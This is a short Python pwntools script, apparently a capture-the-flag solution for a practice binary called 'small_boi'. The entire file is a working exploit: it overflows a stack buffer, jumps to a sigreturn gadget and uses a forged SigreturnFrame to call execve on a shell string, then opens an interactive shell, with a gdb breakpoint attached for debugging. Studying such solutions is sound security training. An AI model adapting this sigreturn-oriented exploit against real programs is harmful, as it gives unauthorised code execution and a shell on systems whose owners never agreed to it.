#coding=utf-8
from pwn import *

context.binary = './small_boi'
p = process('./small_boi')
stack = 0x7fffffffe478
ret = 0x7fffffffe4a0
sigret = 0x400180
syscall = 0x400185
sh = 0x4001ca
frame = SigreturnFrame(kernel = 'amd64')
frame.rdi = sh
frame.rax = 59
frame.rsi = 0
frame.rcx = 0
frame.rip = syscall

gdb.attach(p, 'b *0x40018c')
payload = 'a' * (ret - stack) + p64(sigret) + str(frame)

p.sendline(payload)
p.interactive()
